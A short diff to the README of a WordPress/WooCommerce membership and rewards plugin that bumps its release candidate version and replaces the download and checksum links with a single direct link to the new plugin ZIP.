@@ -1,8 +1,8 @@
 # Ghoroa Hat Smart Membership & Rewards
 
-Version **1.0.0-rc.1** · BD WEBHUT PRIVATE LIMITED · GPL-2.0-or-later
+Version **1.0.0-rc.2** · BD WEBHUT PRIVATE LIMITED · GPL-2.0-or-later
 
-Download the [installable plugin ZIP](dist/ghoroa-hat-rewards-1.0.0-rc.1.zip) or the [complete source archive](dist/ghoroa-hat-rewards-1.0.0-rc.1-source.zip). Open the file and use GitHub’s **Download raw file** button. Checksums are in [SHA256SUMS.txt](dist/SHA256SUMS.txt).
+[Download the updated plugin ZIP](https://github.com/bdwebhut/videoedit/raw/refs/heads/main/dist/ghoroa-hat-rewards-1.0.0-rc.2.zip) · [Design refresh and previews](docs/DESIGN-REFRESH.md)
 
 WordPress/WooCommerce plugin with permanent memberships, separate Trust/Referral/Seeds wallets, native checkout credits, referral attribution, reviewed monthly awards, predefined Magic Boxes, notifications, reporting and audit records.
 
